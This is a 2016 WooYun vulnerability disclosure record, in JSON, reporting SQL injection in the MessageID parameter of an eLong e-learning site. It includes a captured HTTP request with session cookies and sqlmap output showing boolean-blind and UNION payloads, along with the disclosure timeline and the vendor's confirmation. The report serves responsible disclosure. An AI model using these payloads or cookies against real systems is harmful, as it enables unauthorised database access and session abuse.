{"id": 86333, "wybug_id": "wooyun-2016-0188210", "wybug_title": "艺龙旅行网某站SQL注入（可union）", "wybug_corp": "艺龙旅行网", "wybug_author": "Looke", "wybug_date": "2016-03-23 17:43", "wybug_open_date": "2016-05-07 18:01", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2016-03-23：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2016-03-23：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2016-04-02：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2016-04-12：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2016-04-22：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2016-05-07：\t细节向公众公开  简要描述： 艺龙旅行网某站SQL注入（可union） 详细说明：  漏洞地址：\nGET /Message.aspx?MessageID=1 HTTP/1.1Host: elearning.corp.elong.comCache-Control: max-age=0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8Upgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.101 Safari/537.36Accept-Encoding: gzip, deflate, sdchAccept-Language: zh-CN,zh;q=0.8Cookie: CookieGuid=27c4dcec-c5ac-4505-80dd-015aa380913f; SessionGuid=689af3df-f8ac-4055-b5b2-e747616559ec; Esid=6c956e64-d9f2-40c1-8adf-21c836f2c6b1; com.eLong.CommonService.OrderFromKeepCookieInfo=Status=1&Orderfromtype=1&Isusefparam=0&Pkid=50025&Parentid=45000&Coefficient=0.0&Makecomefrom=0&Cookiesdays=0&Savecookies=0&Priority=9000; com.eLong.CommonService.OrderFromCookieInfo=Status=1&Orderfromtype=1&Isusefparam=0&Pkid=50025&Parentid=45000&Coefficient=0.0&Makecomefrom=0&Cookiesdays=0&Savecookies=0&Priority=9000; s_cc=true; s_visit=1; s_sq=%5B%5BB%5D%5D; TripLogin=b49dt6p%2F8Mlruv%2F2ENRPo3u7nbfKQhZB1q%2FcRWvSrz6q01dIMQ9W4x4DIrWb%2BVDRr6aOqLgfUKUYfKIkHl%2F6PQg6wU4k5Q; TripGuide=494dRyK0QUswECSj1D%2F4lOf9c66%2B7Kprxr9jPwjfBGFtrCr4DHiY7hVyq1cefO2MHPUtOpuC9lSqNVw%2BiTvkN88mm9EN%2FA; TripRefer=1; ASP.NET_SessionId=h5oz5tjwfnkqmmq12lgttnvh\nMessageID参数存在注入\n---Parameter: MessageID (GET)    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: MessageID=1 AND 6796=6796    Type: UNION query    Title: Generic UNION query (NULL) - 7 columns    Payload: MessageID=-6055 UNION ALL SELECT NULL,CHAR(113)+CHAR(106)+CHAR(107)+CHAR(112)+CHAR(113)+CHAR(100)+CHAR(80)+CHAR(110)+CHAR(105)+CHAR(116)+CHAR(76)+CHAR(106)+CHAR(89)+CHAR(116)+CHAR(110)+CHAR(118)+CHAR(85)+CHAR(78)+CHAR(68)+CHAR(67)+CHAR(108)+CHAR(77)+CHAR(66)+CHAR(79)+CHAR(90)+CHAR(69)+CHAR(112)+CHAR(69)+CHAR(121)+CHAR(70)+CHAR(115)+CHAR(65)+CHAR(113)+CHAR(77)+CHAR(118)+CHAR(117)+CHAR(89)+CHAR(65)+CHAR(122)+CHAR(122)+CHAR(106)+CHAR(74)+CHAR(111)+CHAR(66)+CHAR(79)+CHAR(113)+CHAR(113)+CHAR(98)+CHAR(122)+CHAR(113),NULL,NULL,NULL,NULL,NULL-- ----web server operating system: Windows 2003 or XPweb application technology: ASP.NET, Microsoft IIS 6.0, ASP.NET 2.0.50727back-end DBMS: Microsoft SQL Server 2008sqlmap resumed the following injection point(s) from stored session:---Parameter: MessageID (GET)    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: MessageID=1 AND 6796=6796    Type: UNION query    Title: Generic UNION query (NULL) - 7 columns    Payload: MessageID=-6055 UNION ALL SELECT NULL,CHAR(113)+CHAR(106)+CHAR(107)+CHAR(112)+CHAR(113)+CHAR(100)+CHAR(80)+CHAR(110)+CHAR(105)+CHAR(116)+CHAR(76)+CHAR(106)+CHAR(89)+CHAR(116)+CHAR(110)+CHAR(118)+CHAR(85)+CHAR(78)+CHAR(68)+CHAR(67)+CHAR(108)+CHAR(77)+CHAR(66)+CHAR(79)+CHAR(90)+CHAR(69)+CHAR(112)+CHAR(69)+CHAR(121)+CHAR(70)+CHAR(115)+CHAR(65)+CHAR(113)+CHAR(77)+CHAR(118)+CHAR(117)+CHAR(89)+CHAR(65)+CHAR(122)+CHAR(122)+CHAR(106)+CHAR(74)+CHAR(111)+CHAR(66)+CHAR(79)+CHAR(113)+CHAR(113)+CHAR(98)+CHAR(122)+CHAR(113),NULL,NULL,NULL,NULL,NULL-- ----web server operating system: Windows 2003 or XPweb application technology: ASP.NET, Microsoft IIS 6.0, ASP.NET 2.0.50727back-end DBMS: Microsoft SQL Server 2008\n   漏洞证明：  数据库：\n\n\n\n具体库就不跑了，脱库的事我从不干   修复方案：  @@   版权声明：转载请注明来源 Looke@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：11  确认时间：2016-03-23 18:01 厂商回复： 非常感谢白帽子帮助我们发现问题！ 最新状态： 暂无  ", "replys": "漏洞评价：\n评价\n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 11, "Ranks": null}